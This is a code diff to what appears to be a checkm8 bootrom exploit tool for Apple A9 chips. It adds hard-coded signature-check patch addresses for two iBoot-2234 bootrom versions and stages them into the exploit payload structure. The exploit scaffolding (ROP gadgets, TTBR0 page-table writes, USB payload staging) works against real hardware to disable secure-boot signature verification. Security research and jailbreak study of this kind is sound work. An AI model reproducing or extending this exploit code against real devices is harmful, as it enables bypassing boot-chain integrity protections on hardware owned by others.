@@ -232,7 +232,7 @@ static struct {
 	uint8_t i_manufacturer, i_product, i_serial_number, b_num_configurations;
 } device_descriptor;
 static size_t config_hole, ttbr0_vrom_off, ttbr0_sram_off, config_large_leak, config_overwrite_pad = offsetof(eclipsa_overwrite_t, synopsys_task.callout);
-static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, total_received, io_buffer_addr, boot_tramp_end, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, arch_task_tramp_addr, insecure_memory_base, synopsys_routine_addr, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor;
+static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, total_received, io_buffer_addr, boot_tramp_end, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, arch_task_tramp_addr, insecure_memory_base, synopsys_routine_addr, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor, sig_patch_addr0, sig_patch_addr1, sig_patch_addr2, sig_patch_addr3;
 
 static void
 sleep_ms(unsigned ms) {
@@ -776,6 +776,10 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.2.22]") != NULL) {
 			cpid = 0x8003;
 			patch_addr = 0x10000812C;
+                        sig_patch_addr0 = 0x100007924;
+                        sig_patch_addr1 = 0x10000792C;
+                        sig_patch_addr2 = 0x100007958;
+                        sig_patch_addr3 = 0x100007C9C; 
 			ttbr0_addr = 0x1800C8000;
 			memcpy_addr = 0x100011030;
 			aes_crypto_cmd = 0x10000DAA0;
@@ -795,6 +799,10 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.3.3]") != NULL) {
 			cpid = 0x8000;
 			patch_addr = 0x10000812C;
+                        sig_patch_addr0 = 0x100007924;
+                        sig_patch_addr1 = 0x10000792C;
+                        sig_patch_addr2 = 0x100007958;
+                        sig_patch_addr3 = 0x100007C9C;
 			ttbr0_addr = 0x1800C8000;
 			memcpy_addr = 0x100011030;
 			aes_crypto_cmd = 0x10000DAA0;
@@ -1183,7 +1191,7 @@ read_binary_file(const char *filename, uint8_t **buf, size_t *len) {
 static bool
 checkm8_stage_patch(const usb_handle_t *handle) {
 	struct {
-		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, ttbr0_vrom_addr, patch_addr, total_received;
+		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, ttbr0_vrom_addr, sig_patch_addr0, sig_patch_addr1, sig_patch_addr2, sig_patch_addr3, total_received;
 	} A9;
 	struct {
 		uint64_t pwnd[2], payload_dest, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr, total_received;
@@ -1293,7 +1301,10 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 				A9.usb_create_string_descriptor = usb_create_string_descriptor;
 				A9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
 				A9.ttbr0_vrom_addr = ttbr0_addr + ttbr0_vrom_off;
-				A9.patch_addr = patch_addr;
+				A9.sig_patch_addr0 = sig_patch_addr0;
+                                A9.sig_patch_addr1 = sig_patch_addr1;
+                                A9.sig_patch_addr2 = sig_patch_addr2;
+                                A9.sig_patch_addr3 = sig_patch_addr3;
 				A9.total_received = total_received;
 				memcpy(data + data_sz, &A9, sizeof(A9));
 				data_sz += sizeof(A9);
